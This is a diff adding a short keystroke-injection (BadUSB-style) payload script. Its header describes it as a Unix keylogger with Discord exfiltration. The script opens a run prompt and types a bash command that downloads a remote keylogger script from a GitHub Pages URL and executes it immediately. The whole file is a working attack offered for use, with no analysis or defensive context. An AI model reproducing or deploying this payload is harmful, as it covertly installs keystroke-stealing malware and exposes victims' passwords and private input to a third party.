@@ -1,0 +1,8 @@
+REM Keylogger Unix Payload
+REM Author: TBJr
+REM Description: Initiates Unix keylogger with Discord exfil
+
+GUI r
+DELAY 500
+STRING bash -c "$(curl -fsSL https://tbjr.github.io/Flipper-payloads/host/keylogger_unix.sh)"
+ENTER
